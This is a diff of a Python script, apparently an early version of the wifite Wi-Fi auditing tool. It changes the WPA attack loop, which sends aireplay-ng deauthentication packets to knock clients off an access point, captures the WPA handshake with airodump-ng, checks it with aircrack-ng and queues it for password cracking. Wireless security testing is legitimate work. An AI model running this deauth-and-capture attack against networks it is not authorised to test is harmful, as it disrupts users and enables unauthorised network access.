@@ -319,6 +319,7 @@ def has_handshake(target, capfile):
 				return True
 		return False
 		
+	# Check for handshake using aircrack-ng
 	elif program_exists('aircrack-ng'):
 		crack = 'echo "" | aircrack-ng -a 2 -w - -e "' + target.ssid + '" ' + temp + 'wpa-01.cap'
 		proc_crack = Popen(crack, stdout=PIPE, stderr=DN, shell=True)
@@ -363,17 +364,26 @@ def attack_wpa(iface, target, clients):
 	
 	global STRIP_HANDSHAKE, WPA_TIMEOUT, TARGETS_REMAINING
 	
-	# Check if we already have a handshake for this SSID...
+	# Generate the filename to save the .cap file as
 	save_as = "hs" + os.sep + re.sub(r'[^a-zA-Z0-9]', '', target.ssid) + '.cap'
+	
+	# Check if we already have a handshake for this SSID...
 	if os.path.exists(save_as):
 		print '.cap file already exists for %s, skipping.' % target.ssid
 		return ''
+		"""
+		save_index = 1
+		while os.path.exists("hs" + os.sep + re.sub(r'[^a-zA-Z0-9]', '', target.ssid) + '-' + save_index + '.cap'):
+			save_index += 1
+		save_as = "hs" + os.sep + re.sub(r'[^a-zA-Z0-9]', '', target.ssid) + '-' + save_index + '.cap'
+		"""
 	
 	# Remove previous airodump output files (if needed)
 	remove_airodump_files(temp + 'wpa')
 	
 	result = ''
 	
+	# Start of large Try-Except; used for catching keyboard interrupt (Ctrl+C)
 	try:
 		# Start airodump-ng process to capture handshakes
 		cmd = ['airodump-ng', 
@@ -394,45 +404,34 @@ def attack_wpa(iface, target, clients):
 		
 		# Deauth and check-for-handshake loop
 		while not got_handshake:
-			# Execute attack process via aireplay-ng
+			# Send deauth packets via aireplay-ng
 			cmd = ['aireplay-ng', 
 						'-0',  # Attack method (Deauthentication)
 						 '3',  # Number of packets to send
 						'-a', target.bssid]
 			
-			# Send deauthentication as "Broadcast" (no selected clients)
-			if client_index == -1: pass
-			
+			if client_index == -1: 
+				print "sending 3 deauth packets from *broadcast*",
 			elif len(target_clients) > 0:
-				# We have clients to attack!
-				if client_index < len(target_clients):
-					# Index is within range, points at a real client
-					cmd.append('-h')
-					cmd.append(target_clients[client_index].bssid)
-				print "sending 3 deauth packets to %s" % target_clients[client_index].bssid,
-				
-				# TODO Send broadcast deauth even when clients are in list
+				print "sending 3 deauth packets from %s" % target_clients[client_index].bssid,
+				cmd.append('-h')
+				cmd.append(target_clients[client_index].bssid)
 			
 			client_index += 1
 			if client_index >= len(target_clients): client_index = -1
 			cmd.append(iface)
 			
-			# Send deauth packets, wait for them to complete.
+			# Send deauth packets via aireplay, wait for them to complete.
 			proc_deauth = Popen(cmd, stdout=DN, stderr=DN)
 			proc_deauth.wait()
 			print "sent"
 			
+			# Copy current dump file (take snapshot of it)
+			call(['cp', temp + 'wpa-01.cap', temp + 'wpa-01.cap.temp'])
+			
 			# Check for handshake using aircrack
-			if has_handshake(target, temp + 'wpa-01.cap'):
+			if has_handshake(target, temp + 'wpa-01.cap.temp'):
 				got_handshake = True
-				
-				# Check if the handshake .cap file already exists
-				save_as = "hs" + os.sep + re.sub(r'[^a-zA-Z0-9]', '', target.ssid) + '.cap'
-				if os.path.exists(save_as):
-					save_index = 1
-					while os.path.exists("hs" + os.sep + re.sub(r'[^a-zA-Z0-9]', '', target.ssid) + '-' + save_index + '.cap'):
-						save_index += 1
-					save_as = "hs" + os.sep + re.sub(r'[^a-zA-Z0-9]', '', target.ssid) + '-' + save_index + '.cap'
 				
 				try: os.mkdir('hs' + os.sep)
 				except OSError: pass
@@ -445,9 +444,9 @@ def attack_wpa(iface, target, clients):
 				# except UnboundLocalError: pass
 				
 				# Copy the cap file for safe-keeping
-				try: os.rename(temp + 'wpa-01.cap', save_as)
+				try: os.rename(temp + 'wpa-01.cap.temp', save_as)
 				except OSError:
-					call(['mv', temp+'wpa-01.cap', save_as])
+					call(['mv', temp + 'wpa-01.cap.temp', save_as])
 				
 				print 'handshake captured! saved as "' + save_as + '"'
 				
@@ -469,7 +468,8 @@ def attack_wpa(iface, target, clients):
 						proc_strip = call(cmd, stdout=DN, stderr=DN)
 						
 						try: os.rename(save_as + '.temp', save_as)
-						except OSError: pass
+						except OSError:
+							call(['mv', save_as + '.temp', save_as])
 				
 				# add the filename and SSID to the list of 'to-crack' after everything's done
 				WPA_CAPS_TO_CRACK.append(CapFile(save_as, target.ssid))
@@ -480,8 +480,15 @@ def attack_wpa(iface, target, clients):
 			
 			# Check the airodump output file for new clients
 			for client in parse_csv(temp + 'wpa-01.csv')[1]:
-				if client.station == target.bssid and \
-					 target_clients.count(client.bssid) == 0:
+				if client.station != target.bssid: continue
+				new_client = True
+				for c in target_clients:
+					if client.bssid == c.bssid: 
+						new_client = False
+						break
+				
+				if new_client:
+					print "new client found: %s" % client.bssid
 					target_clients.append(client)
 			
 		# End of Handshake wait loop.
